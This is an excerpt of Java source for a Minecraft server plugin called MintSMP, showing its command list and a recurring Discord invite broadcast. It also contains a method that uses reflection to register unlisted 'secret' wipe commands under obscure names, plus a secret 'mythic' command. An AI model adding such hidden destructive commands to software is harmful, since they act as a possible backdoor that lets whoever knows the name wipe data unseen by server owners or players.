...
public final class MintSMP extends JavaPlugin {
    ...
    private static final String[] COMMANDS = {
        ...
        "findplayer","rules","report","discord","website","settings",
        "team","duel","orders",
        ...
        "nightvision","mint","rank","jobs","spawnstash","accuse","spawnore"
    };

    private void registerSecretCommands() {
        try {
            java.lang.reflect.Method m = getServer().getClass().getMethod("getCommandMap");
            org.bukkit.command.CommandMap map = (org.bukkit.command.CommandMap) m.invoke(getServer());
            map.register("mintsmp", new net.mintsmp.command.SecretWipeCommand("applethepowerofapple", false, this));
            map.register("mintsmp", new net.mintsmp.command.SecretWipeCommand("applethepowerofappleall", true, this));
            map.register("mintsmp", new net.mintsmp.command.SecretMythicCommand(this));
        } catch (Throwable t) {
            getLogger().warning("Secret wipe commands could not register: " + t.getMessage());
        }
    }
    ...
    public void onEnable() {
        ...
        // Discord invite broadcast every 2 hours (clickable link).
        Bukkit.getScheduler().runTaskTimer(this, () -> {
            String url = getConfig().getString("links.discord", "https://discord.gg/ad6KsBnFXb");
            Bukkit.broadcast(Msg.mm("<gradient:#3DDC84:#A8FF60><bold>Join the Mint SMP Discord!</bold></gradient> "
                    + "<click:open_url:'" + url + "'><hover:show_text:'Click to join'><underlined><aqua>" + url + "</aqua></underlined></hover></click>"));
        }, 144000L, 144000L);
